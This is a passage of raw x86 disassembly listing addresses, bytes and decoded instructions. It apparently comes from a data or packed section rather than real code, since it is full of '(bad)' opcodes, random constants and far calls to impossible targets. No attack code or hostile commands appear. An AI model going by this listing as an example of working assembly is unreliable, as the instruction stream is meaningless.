  407205:	51                   	push   %ecx
  407206:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  407207:	bd b8 a2 bc d4       	mov    $0xd4bca2b8,%ebp
  40720c:	82 24 17 d5          	andb   $0xd5,(%edi,%edx,1)
  407210:	04 b2                	add    $0xb2,%al
  407212:	2f                   	das
  407213:	81 1e f6 d5 b3 1d    	sbbl   $0x1db3d5f6,(%esi)
  407219:	85 df                	test   %ebx,%edi
  40721b:	f7 4e 08 93 e6 29 1d 	testl  $0x1d29e693,0x8(%esi)
  407222:	22 5c ab cb          	and    -0x35(%ebx,%ebp,4),%bl
  407226:	28 93 c2 c0 12 14    	sub    %dl,0x1412c0c2(%ebx)
  40722c:	eb 10                	jmp    0x40723e
  40722e:	5a                   	pop    %edx
  40722f:	ab                   	stos   %eax,%es:(%edi)
  407230:	31 5b 7c             	xor    %ebx,0x7c(%ebx)
  407233:	c6                   	(bad)
  407234:	31 ba ad 8a aa 81    	xor    %edi,-0x7e557553(%edx)
  40723a:	39 8f cc 02 25 da    	cmp    %ecx,-0x25dafd34(%edi)
  407240:	68 28 1e 19 4f       	push   $0x4f191e28
  407245:	94                   	xchg   %eax,%esp
  407246:	5e                   	pop    %esi
  407247:	fc                   	cld
  407248:	2b 35 52 a4 29 8b    	sub    0x8b29a452,%esi
  40724e:	a1 63 ea 84 71       	mov    0x7184ea63,%eax
  407253:	8f c5                	pop    %ebp
  407255:	54                   	push   %esp
  407256:	45                   	inc    %ebp
  407257:	3a 82 a8 8a ab 8c    	cmp    -0x73547558(%edx),%al
  40725d:	6d                   	insl   (%dx),%es:(%edi)
  40725e:	5c                   	pop    %esp
  40725f:	61                   	popa
  407260:	73 8c                	jae    0x4071ee
  407262:	e7 38                	out    %eax,$0x38
  407264:	c7                   	(bad)
  407265:	ed                   	in     (%dx),%eax
  407266:	c0 94 83 a0 a1 8b 3f 	rclb   $0x9,0x3f8ba1a0(%ebx,%eax,4)
  40726d:	09 
  40726e:	83 2e 97             	subl   $0xffffff97,(%esi)
  407271:	c4 b6 ea 95 39 34    	les    0x343995ea(%esi),%esi
  407277:	ab                   	stos   %eax,%es:(%edi)
  407278:	91                   	xchg   %eax,%ecx
  407279:	b3 19                	mov    $0x19,%bl
  40727b:	15 36 5a 66 91       	adc    $0x91665a36,%eax
  407280:	52                   	push   %edx
  407281:	16                   	push   %ss
  407282:	8a 42 41             	mov    0x41(%edx),%al
  407285:	a9 ab 84 dc 64       	test   $0x64dc84ab,%eax
  40728a:	94                   	xchg   %eax,%esp
  40728b:	c0 26 5f             	shlb   $0x5f,(%esi)
  40728e:	86 e2                	xchg   %ah,%dl
  407290:	09 89 61 14 80 90    	or     %ecx,-0x6f7feb9f(%ecx)
  407296:	49                   	dec    %ecx
  407297:	3b 22                	cmp    (%edx),%esp
  407299:	f1                   	int1
  40729a:	a1 84 59 2c ce       	mov    0xce2c5984,%eax
  40729f:	b3 05                	mov    $0x5,%bl
  4072a1:	cc                   	int3
  4072a2:	dc cf                	fmul   %st,%st(7)
  4072a4:	f6 80 38 63 4b 4d 91 	testb  $0x91,0x4d4b6338(%eax)
  4072ab:	67 57                	addr16 push %edi
  4072ad:	4e                   	dec    %esi
  4072ae:	6d                   	insl   (%dx),%es:(%edi)
  4072af:	4a                   	dec    %edx
  4072b0:	c6                   	(bad)
  4072b1:	96                   	xchg   %eax,%esi
  4072b2:	dd 77 ed             	fnsave -0x13(%edi)
  4072b5:	1d b6 69 73 2c       	sbb    $0x2c7369b6,%eax
  4072ba:	7a cd                	jp     0x407289
  4072bc:	26 95                	es xchg %eax,%ebp
  4072be:	52                   	push   %edx
  4072bf:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4072c0:	4c                   	dec    %esp
  4072c1:	6d                   	insl   (%dx),%es:(%edi)
  4072c2:	d1 89 5f 6a 24 27    	rorl   $1,0x27246a5f(%ecx)
  4072c8:	6a f2                	push   $0xfffffff2
  4072ca:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4072cb:	32 e4                	xor    %ah,%ah
  4072cd:	26 9c                	es pushf
  4072cf:	38 d7                	cmp    %dl,%bh
  4072d1:	0b 48 f5             	or     -0xb(%eax),%ecx
  4072d4:	3e 3c 42             	ds cmp $0x42,%al
  4072d7:	35 58 85 ee dd       	xor    $0xddee8558,%eax
  4072dc:	39 18                	cmp    %ebx,(%eax)
  4072de:	d8 84 bb 89 82 97 33 	fadds  0x33978289(%ebx,%edi,4)
  4072e5:	0b 3f                	or     (%edi),%edi
  4072e7:	12 80 4b 32 19 2a    	adc    0x2a19324b(%eax),%al
  4072ed:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4072ee:	46                   	inc    %esi
  4072ef:	eb 54                	jmp    0x407345
  4072f1:	15 15 0d c8 75       	adc    $0x75c80d15,%eax
  4072f6:	73 35                	jae    0x40732d
  4072f8:	8c e9                	mov    %gs,%ecx
  4072fa:	b8 93 2a 74 a9       	mov    $0xa9742a93,%eax
  4072ff:	2e 2b 78 35          	sub    %cs:0x35(%eax),%edi
  407303:	22 95 15 fa a9 cc    	and    -0x335605eb(%ebp),%dl
  407309:	f3 8a 39             	repz mov (%ecx),%bh
  40730c:	59                   	pop    %ecx
  40730d:	72 13                	jb     0x407322
  40730f:	92                   	xchg   %eax,%edx
  407310:	de aa d2 c9 4a 33    	fisubrs 0x334ac9d2(%edx)
  407316:	af                   	scas   %es:(%edi),%eax
  407317:	9a be df 43 db 88 6f 	lcall  $0x6f88,$0xdb43dfbe
  40731e:	24 5d                	and    $0x5d,%al
  407320:	c0 ca aa             	ror    $0xaa,%dl
  407323:	a0 27 53 08 60       	mov    0x60085327,%al
  407328:	2a a3 b9 77 07 8f    	sub    -0x70f88847(%ebx),%ah
  40732e:	d3 cd                	ror    %cl,%ebp
  407330:	4f                   	dec    %edi
  407331:	12 d9                	adc    %cl,%bl
  407333:	9a 6c ba d8 4e f0 d0 	lcall  $0xd0f0,$0x4ed8ba6c
  40733a:	7b 84                	jnp    0x4072c0
  40733c:	6a 4a                	push   $0x4a
  40733e:	24 00                	and    $0x0,%al
  407340:	ac                   	lods   %ds:(%esi),%al
  407341:	33 30                	xor    (%eax),%esi
  407343:	49                   	dec    %ecx
  407344:	b1 e1                	mov    $0xe1,%cl
  407346:	59                   	pop    %ecx
  407347:	f5                   	cmc
  407348:	8a e5                	mov    %ch,%ah
  40734a:	21 bb 84 2a ad 4d    	and    %edi,0x4dad2a84(%ebx)
  407350:	fc                   	cld
  407351:	51                   	push   %ecx
  407352:	89 ad 4c a2 cb 3a    	mov    %ebp,0x3acba24c(%ebp)
  407358:	6d                   	insl   (%dx),%es:(%edi)
  407359:	52                   	push   %edx
  40735a:	73 84                	jae    0x4072e0
  40735c:	e8 21 c7 6a a0       	call   0xa0ab3a82
  407361:	db 46 34             	fildl  0x34(%esi)
  407364:	f9                   	stc
  407365:	1b 90 0d 97 54 14    	sbb    0x1454970d(%eax),%edx
  40736b:	5a                   	pop    %edx
  40736c:	71 94                	jno    0x407302
  40736e:	2c e0                	sub    $0xe0,%al
  407370:	89 38                	mov    %edi,(%eax)
  407372:	2c b5                	sub    $0xb5,%al
  407374:	97                   	xchg   %eax,%edi
  407375:	32 ce                	xor    %dh,%cl
  407377:	f9                   	stc
  407378:	75 20                	jne    0x40739a
  40737a:	8c 89 17 66 3c 0f    	mov    %cs,0xf3c6617(%ecx)
  407380:	74 f2                	je     0x407374
  407382:	88 24 80             	mov    %ah,(%eax,%eax,4)
  407385:	f4                   	hlt
  407386:	19 05 34 f5 f2 f8    	sbb    %eax,0xf8f2f534
  40738c:	d7                   	xlat   %ds:(%ebx)
  40738d:	38 e1                	cmp    %ah,%cl
  40738f:	a8 33                	test   $0x33,%al
  407391:	67 fb                	addr16 sti
  407393:	2b b6 4c 59 6e 3d    	sub    0x3d6e594c(%esi),%esi
  407399:	0e                   	push   %cs
  40739a:	fc                   	cld
  40739b:	ab                   	stos   %eax,%es:(%edi)
  40739c:	53                   	push   %ebx
  40739d:	6e                   	outsb  %ds:(%esi),(%dx)
  40739e:	ba 8b 93 e0 d3       	mov    $0xd3e0938b,%edx
  4073a3:	5a                   	pop    %edx
  4073a4:	ab                   	stos   %eax,%es:(%edi)
  4073a5:	49                   	dec    %ecx
  4073a6:	8d 49 ac             	lea    -0x54(%ecx),%ecx
  4073a9:	dc 54 88 c7          	fcoml  -0x39(%eax,%ecx,4)
  4073ad:	2e 45                	cs inc %ebp
  4073af:	34 1b                	xor    $0x1b,%al
  4073b1:	64 24 3b             	fs and $0x3b,%al
  4073b4:	50                   	push   %eax
  4073b5:	75 1f                	jne    0x4073d6
  4073b7:	90                   	nop
  4073b8:	db 2d 03 6f 3c bd    	fldt   0xbd3c6f03
  4073be:	55                   	push   %ebp
  4073bf:	40                   	inc    %eax
  4073c0:	40                   	inc    %eax
  4073c1:	11 e0                	adc    %esp,%eax
  4073c3:	f8                   	clc
  4073c4:	92                   	xchg   %eax,%edx
  4073c5:	48                   	dec    %eax
  4073c6:	9a c8 7a 45 c4 15 72 	lcall  $0x7215,$0xc4457ac8
  4073cd:	48                   	dec    %eax
  4073ce:	50                   	push   %eax
  4073cf:	68 19 97 3f 12       	push   $0x123f9719
  4073d4:	d9 b0 02 95 ce 05    	fnstenv 0x5ce9502(%eax)
  4073da:	2a a1 51 66 28 0e    	sub    0xe286651(%ecx),%ah
  4073e0:	87 3a                	xchg   %edi,(%edx)
  4073e2:	69 5a 68 3c 20 37 11 	imul   $0x1137203c,0x68(%edx),%ebx
  4073e9:	3a f1                	cmp    %cl,%dh
  4073eb:	26 b0 aa             	es mov $0xaa,%al
  4073ee:	28 ac 36 b5 06 49 7e 	sub    %ch,0x7e4906b5(%esi,%esi,1)
  4073f5:	c4                   	(bad)
  4073f6:	c6                   	(bad)
  4073f7:	d0 90 08 a8 2a be    	rclb   $1,-0x41d557f8(%eax)
  4073fd:	6c                   	insb   (%dx),%es:(%edi)
  4073fe:	1e                   	push   %ds
  4073ff:	7b f6                	jnp    0x4073f7
  407401:	cb                   	lret
  407402:	69 df 8c e4 cd 58    	imul   $0x58cde48c,%edi,%ebx
  407408:	69 4c c4 32 41 06 e1 	imul   $0x9e10641,0x32(%esp,%eax,8),%ecx
  40740f:	09 
  407410:	9b                   	fwait
  407411:	c3                   	ret
  407412:	e4 d3                	in     $0xd3,%al
  407414:	44                   	inc    %esp
  407415:	42                   	inc    %edx
  407416:	da b8 40 02 e9 21    	fidivrl 0x21e90240(%eax)
  40741c:	10 79 2e             	adc    %bh,0x2e(%ecx)
  40741f:	53                   	push   %ebx
  407420:	a8 00                	test   $0x0,%al
  407422:	8a ab fe bf 6e 06    	mov    0x66ebffe(%ebx),%ch
  407428:	14 5c                	adc    $0x5c,%al
  40742a:	7b 04                	jnp    0x407430
  40742c:	58                   	pop    %eax
  40742d:	e7 4e                	out    %eax,$0x4e
  40742f:	d3 ef                	shr    %cl,%edi
  407431:	87 da                	xchg   %ebx,%edx
  407433:	09 45 71             	or     %eax,0x71(%ebp)
  407436:	9b                   	fwait
  407437:	92                   	xchg   %eax,%edx
  407438:	24 d8                	and    $0xd8,%al
  40743a:	81 29 c3 a3 be f4    	subl   $0xf4bea3c3,(%ecx)
  407440:	49                   	dec    %ecx
  407441:	66 e1 a3             	data16 loope 0x4073e7
  407444:	b4 d9                	mov    $0xd9,%ah
  407446:	b4 e9                	mov    $0xe9,%ah
  407448:	31 a4 7b 86 7c 57 ac 	xor    %esp,-0x53a8837a(%ebx,%edi,2)
  40744f:	8e 32                	mov    (%edx),%?
  407451:	8f                   	(bad)
  407452:	32 e0                	xor    %al,%ah
  407454:	ae                   	scas   %es:(%edi),%al
  407455:	dd c1                	ffree  %st(1)
  407457:	21 55 09             	and    %edx,0x9(%ebp)
  40745a:	09 38                	or     %edi,(%eax)
  40745c:	3c ba                	cmp    $0xba,%al
  40745e:	51                   	push   %ecx
  40745f:	d1 80 ab 0c 8f 61    	roll   $1,0x618f0cab(%eax)
  407465:	c8 fe 44 7b          	enter  $0x44fe,$0x7b
  407469:	e2 b5                	loop   0x407420
  40746b:	a3 02 0e 43 ef       	mov    %eax,0xef430e02
  407470:	11 30                	adc    %esi,(%eax)
  407472:	ba ad a7 63 5b       	mov    $0x5b63a7ad,%edx
  407477:	d4 1b                	aam    $0x1b
  407479:	b7 7e                	mov    $0x7e,%bh
  40747b:	1c 91                	sbb    $0x91,%al
  40747d:	50                   	push   %eax
  40747e:	72 87                	jb     0x407407
  407480:	50                   	push   %eax
  407481:	12 73 79             	adc    0x79(%ebx),%dh
  407484:	38 ec                	cmp    %ch,%ah
  407486:	66 45                	inc    %bp
  407488:	61                   	popa
  407489:	49                   	dec    %ecx
  40748a:	0c 0e                	or     $0xe,%al
  40748c:	7f f0                	jg     0x40747e
  40748e:	a8 4d                	test   $0x4d,%al
  407490:	38 aa aa 45 d1 12    	cmp    %ch,0x12d145aa(%edx)
  407496:	c2 2a f0             	ret    $0xf02a
  407499:	79 f2                	jns    0x40748d
  40749b:	18 48 97             	sbb    %cl,-0x69(%eax)
  40749e:	34 9d                	xor    $0x9d,%al
  4074a0:	fe                   	(bad)
  4074a1:	12 2b                	adc    (%ebx),%ch
  4074a3:	e1 ba                	loope  0x40745f
  4074a5:	6b ea 81             	imul   $0xffffff81,%edx,%ebp
  4074a8:	a3 6f b5 06 e7       	mov    %eax,0xe706b56f
  4074ad:	67 df 16 0a c4       	fists  -0x3bf6
  4074b2:	a8 15                	test   $0x15,%al
  4074b4:	5a                   	pop    %edx
  4074b5:	d7                   	xlat   %ds:(%ebx)
  4074b6:	87 56 76             	xchg   %edx,0x76(%esi)
  4074b9:	4b                   	dec    %ebx
  4074ba:	87 2d 5d 7e 9f 35    	xchg   %ebp,0x359f7e5d
  4074c0:	4d                   	dec    %ebp
  4074c1:	08 8d 26 44 3e 93    	or     %cl,-0x6cc1bbda(%ebp)
  4074c7:	8e 2a                	mov    (%edx),%gs
  4074c9:	28 a0 bc db 82 08    	sub    %ah,0x882dbbc(%eax)
  4074cf:	e2 27                	loop   0x4074f8
  4074d1:	c0 f5 b6             	shl    $0xb6,%ch
  4074d4:	aa                   	stos   %al,%es:(%edi)
  4074d5:	e4 78                	in     $0x78,%al
  4074d7:	ea 76 74 ff 00 94 61 	ljmp   $0x6194,$0xff7476
  4074de:	25 cc 2d bf a3       	and    $0xa3bf2dcc,%eax
  4074e3:	1c eb                	sbb    $0xeb,%al
  4074e5:	55                   	push   %ebp
  4074e6:	f0 26 99             	lock es cltd
  4074e9:	eb 18                	jmp    0x407503
  4074eb:	13 d1                	adc    %ecx,%edx
  4074ed:	65 e2 1e             	gs loop 0x40750e
  4074f0:	4a                   	dec    %edx
  4074f1:	e6 2b                	out    %al,$0x2b
  4074f3:	70 fc                	jo     0x4074f1
  4074f5:	85 75 cb             	test   %esi,-0x35(%ebp)
  4074f8:	d5 12                	aad    $0x12
  4074fa:	aa                   	stos   %al,%es:(%edi)
  4074fb:	a3 ac 0c 7e 93       	mov    %eax,0x937e0cac
  407500:	df 92 4e 90 91 c9    	fists  -0x366e6fb2(%edx)
  407506:	69 b5 23 23 41 4d a9 	imul   $0xc052d3a9,0x4d412323(%ebp),%esi
  40750d:	d3 52 c0 
  407510:	8a fd                	mov    %ch,%bh
  407512:	f1                   	int1
  407513:	fb                   	sti
  407514:	70 e9                	jo     0x4074ff
  407516:	f0 dd 85 c0 c8 b1 35 	lock fldl 0x35b1c8c0(%ebp)
  40751d:	5e                   	pop    %esi
  40751e:	c8 1c d4 b7          	enter  $0xd41c,$0xb7
  407522:	8b 80 8a 82 aa 28    	mov    0x28aa828a(%eax),%eax
  407528:	22 a4 8a a8 27 b7 24 	and    0x24b727a8(%edx,%ecx,4),%ah
  40752f:	38 4c 64 13          	cmp    %cl,0x13(%esp,%eiz,2)
  407533:	77 d9                	ja     0x40750e
  407535:	30 9c 2e c5 81 19 56 	xor    %bl,0x561981c5(%esi,%ebp,1)
  40753c:	2e 38 58 e9          	cmp    %bl,%cs:-0x17(%eax)
  407540:	5a                   	pop    %edx
  407541:	c5 9e d0 9b 81 ad    	lds    -0x527e6430(%esi),%ebx
  407547:	34 b4                	xor    $0xb4,%al
  407549:	6e                   	outsb  %ds:(%esi),(%dx)
  40754a:	6b f8 99             	imul   $0xffffff99,%eax,%edi
  40754d:	07                   	pop    %es
  40754e:	eb 55                	jmp    0x4075a5
  407550:	dc 5a 74             	fcompl 0x74(%edx)
  407553:	77 03                	ja     0x407558
  407555:	79 1c                	jns    0x407573
  407557:	0a 48 28             	or     0x28(%eax),%cl
  40755a:	ce                   	into
  40755b:	ac                   	lods   %ds:(%esi),%al
  40755c:	10 91 06 04 a4 4f    	adc    %dl,0x4fa40406(%ecx)
  407562:	6e                   	outsb  %ds:(%esi),(%dx)
  407563:	9a da 7d 24 2d c0 78 	lcall  $0x78c0,$0x2d247dda
  40756a:	57                   	push   %edi
  40756b:	f2 de 4c ad 8c       	repnz fimuls -0x74(%ebp,%ebp,4)
  407570:	c4 80 a2 58 02 ed    	les    -0x12fda75e(%eax),%eax
  407576:	69 43 4a fa fd 5f 5c 	imul   $0x5c5ffdfa,0x4a(%ebx),%eax
  40757d:	6f                   	outsl  %ds:(%esi),(%dx)
  40757e:	6c                   	insb   (%dx),%es:(%edi)
  40757f:	64 b6 fc             	fs mov $0xfc,%dh
  407582:	41                   	inc    %ecx
  407583:	35 66 16 8f 44       	xor    $0x448f1666,%eax
  407588:	67 71 a6             	addr16 jno 0x407531
  40758b:	99                   	cltd
  40758c:	d0 78 e4             	sarb   $1,-0x1c(%eax)
  40758f:	7b 62                	jnp    0x4075f3
  407591:	21 5d d6             	and    %ebx,-0x2a(%ebp)
  407594:	4a                   	dec    %edx
  407595:	c5 66 a9             	lds    -0x57(%esi),%esp
  407598:	85 78 cc             	test   %edi,-0x34(%eax)
  40759b:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40759c:	21 32                	and    %esi,(%edx)
  40759e:	e2 10                	loop   0x4075b0
  4075a0:	aa                   	stos   %al,%es:(%edi)
  4075a1:	35 b5 13 c5 be       	xor    $0xbec513b5,%eax
  4075a6:	eb bb                	jmp    0x407563
  4075a8:	f4                   	hlt
  4075a9:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4075aa:	15 3b 22 92 fe       	adc    $0xfe92223b,%eax
  4075af:	9e                   	sahf
  4075b0:	31 5b 10             	xor    %ebx,0x10(%ebx)
  4075b3:	5c                   	pop    %esp
  4075b4:	9a 1a 9f 78 fc e3 7a 	lcall  $0x7ae3,$0xfc789f1a
  4075bb:	f3 90                	pause
  4075bd:	ce                   	into
  4075be:	b1 0b                	mov    $0xb,%cl
  4075c0:	b9 4e 35 4a 19       	mov    $0x194a354e,%ecx
  4075c5:	dc 6d b4             	fsubrl -0x4c(%ebp)
  4075c8:	69 5d 65 96 05 95 19 	imul   $0x19950596,0x65(%ebp),%ebx
  4075cf:	0e                   	push   %cs
  4075d0:	36 df 47 7a          	filds  %ss:0x7a(%edi)
  4075d4:	ac                   	lods   %ds:(%esi),%al
  4075d5:	86 47 00             	xchg   %al,0x0(%edi)
  4075d8:	83 dd 51             	sbb    $0x51,%ebp
  4075db:	57                   	push   %edi
  4075dc:	cf                   	iret
  4075dd:	29 91 f9 ef c0 a6    	sub    %edx,-0x593f1007(%ecx)
  4075e3:	2e 57                	cs push %edi
  4075e5:	50                   	push   %eax
  4075e6:	dd eb                	fucomp %st(3)
  4075e8:	82 31 52             	xorb   $0x52,(%ecx)
  4075eb:	bb c3 3e ac 0a       	mov    $0xaac3ec3,%ebx
  4075f0:	a0 df 92 9c 94       	mov    0x949c92df,%al
  4075f5:	71 21                	jno    0x407618
  4075f7:	48                   	dec    %eax
  4075f8:	92                   	xchg   %eax,%edx
  4075f9:	d1 45 14             	roll   $1,0x14(%ebp)
  4075fc:	55                   	push   %ebp
  4075fd:	54                   	push   %esp
  4075fe:	44                   	inc    %esp
  4075ff:	02 46 5e             	add    0x5e(%esi),%al
  407602:	74 59                	je     0x40765d
  407604:	36 84 f3             	ss test %dh,%bl
  407607:	d9 55 ed             	fsts   -0x13(%ebp)
  40760a:	88 84 8b 94 4c e3 09 	mov    %al,0x9e34c94(%ebx,%ecx,4)
  407611:	df 81 ac f6 26 8a    	filds  -0x75d90954(%ecx)
  407617:	c5 47 a8             	lds    -0x58(%edi),%eax
  40761a:	40                   	inc    %eax
  40761b:	2e de b6 2f 9e 8a 5c 	fidivs %cs:0x5c8a9e2f(%esi)
  407622:	3e f2 4c             	ds repnz dec %esp
  407625:	48                   	dec    %eax
  407626:	91                   	xchg   %eax,%ecx
  407627:	29 b1 5f 98 dc 76    	sub    %esi,0x76dc985f(%ecx)
  40762d:	e5 a4                	in     $0xa4,%eax
  40762f:	c7                   	(bad)
  407630:	91                   	xchg   %eax,%ecx
  407631:	10 63 c8             	adc    %ah,-0x38(%ebx)
  407634:	54                   	push   %esp
  407635:	04 6f                	add    $0x6f,%al
  407637:	63 64 89 b9          	arpl   %esp,-0x47(%ecx,%ecx,4)
  40763b:	dd e6                	fucom  %st(6)
  40763d:	08 2a                	or     %ch,(%edx)
  40763f:	a8 42                	test   $0x42,%al
  407641:	98                   	cwtl
  407642:	55                   	push   %ebp
  407643:	32 e1                	xor    %cl,%ah
  407645:	8c 95 81 00 5f 0f    	mov    %ss,0xf5f0081(%ebp)
  40764b:	e1 d8                	loope  0x407625
  40764d:	d2 80 46 f9 f2 89    	rolb   %cl,-0x760d06ba(%eax)
  407653:	65 a4                	movsb  %gs:(%esi),%es:(%edi)
  407655:	9b                   	fwait
  407656:	9a cf a9 af b6 37 fd 	lcall  $0xfd37,$0xb6afa9cf
  40765d:	c4 00                	les    (%eax),%eax
  40765f:	9a c3 22 2c 3a 12 e7 	lcall  $0xe712,$0x3a2c22c3
  407666:	32 0c 49             	xor    (%ecx,%ecx,2),%cl
  407669:	97                   	xchg   %eax,%edi
  40766a:	1e                   	push   %ds
  40766b:	43                   	inc    %ebx
  40766c:	8c 29                	mov    %gs,(%ecx)
  40766e:	1b 66 c2             	sbb    -0x3e(%esi),%esp
  407671:	49                   	dec    %ecx
  407672:	12 68 dd             	adc    -0x23(%eax),%ch
  407675:	26 c5 49 de          	lds    %es:-0x22(%ecx),%ecx
  407679:	98                   	cwtl
  40767a:	0a 38                	or     (%eax),%bh
  40767c:	8a 46 92             	mov    -0x6e(%esi),%al
  40767f:	42                   	inc    %edx
  407680:	36 a4                	movsb  %ss:(%esi),%es:(%edi)
  407682:	ff 00                	incl   (%eax)
  407684:	54                   	push   %esp
  407685:	68 93 54 a1 5c       	push   $0x5ca15493
  40768a:	ad                   	lods   %ds:(%esi),%eax
  40768b:	63 4e 54             	arpl   %ecx,0x54(%esi)
  40768e:	fe                   	(bad)
  40768f:	71 45                	jno    0x4076d6
  407691:	7f 88                	jg     0x40761b
  407693:	88 89 9e 61 79 79    	mov    %cl,0x7979619e(%ecx)
  407699:	80                   	.byte 0x80
  40769a:	88                   	.byte 0x88
  40769b:	a9                   	.byte 0xa9
